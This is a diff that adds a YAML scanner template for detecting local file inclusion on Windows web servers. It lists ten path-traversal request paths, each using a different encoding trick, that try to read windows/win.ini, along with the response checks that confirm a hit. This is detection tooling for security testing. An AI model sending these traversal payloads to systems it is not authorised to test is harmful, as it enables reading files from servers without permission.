@@ -1,0 +1,60 @@
+id: generic-windows-lfi
+
+info:
+  name: Generic Windows based LFI Test
+  author: mesaglio,sushantkamble
+  severity: high
+  description: Searches for /windows/win.ini on passed URLs
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cwindows/win.ini
+    expression: response.status == 200 && response.body.bcontains(b'bit app support') && response.body.bcontains(b'fonts') && response.body.bcontains(b'extensions')
+  r1:
+    request:
+      method: GET
+      path: /./../../../../../../../../../../windows/win.ini
+    expression: response.status == 200 && response.body.bcontains(b'bit app support') && response.body.bcontains(b'fonts') && response.body.bcontains(b'extensions')
+  r2:
+    request:
+      method: GET
+      path: /.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/windows/win.ini
+    expression: response.status == 200 && response.body.bcontains(b'bit app support') && response.body.bcontains(b'fonts') && response.body.bcontains(b'extensions')
+  r3:
+    request:
+      method: GET
+      path: /.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./windows/win.ini
+    expression: response.status == 200 && response.body.bcontains(b'bit app support') && response.body.bcontains(b'fonts') && response.body.bcontains(b'extensions')
+  r4:
+    request:
+      method: GET
+      path: /%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2ewindows/win.ini
+    expression: response.status == 200 && response.body.bcontains(b'bit app support') && response.body.bcontains(b'fonts') && response.body.bcontains(b'extensions')
+  r5:
+    request:
+      method: GET
+      path: /%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows/win.ini
+    expression: response.status == 200 && response.body.bcontains(b'bit app support') && response.body.bcontains(b'fonts') && response.body.bcontains(b'extensions')
+  r6:
+    request:
+      method: GET
+      path: /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini
+    expression: response.status == 200 && response.body.bcontains(b'bit app support') && response.body.bcontains(b'fonts') && response.body.bcontains(b'extensions')
+  r7:
+    request:
+      method: GET
+      path: /?redirect=..%2f..%2f..%2f..%2fwindows/win.ini
+    expression: response.status == 200 && response.body.bcontains(b'bit app support') && response.body.bcontains(b'fonts') && response.body.bcontains(b'extensions')
+  r8:
+    request:
+      method: GET
+      path: /?page=..%2f..%2f..%2f..%2f..%2fwindows/win.ini
+    expression: response.status == 200 && response.body.bcontains(b'bit app support') && response.body.bcontains(b'fonts') && response.body.bcontains(b'extensions')
+  r9:
+    request:
+      method: GET
+      path: /?url=..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini
+    expression: response.status == 200 && response.body.bcontains(b'bit app support') && response.body.bcontains(b'fonts') && response.body.bcontains(b'extensions')
+expression: r0() || r1() || r2() || r3() || r4() || r5() || r6() || r7() || r8() || r9()
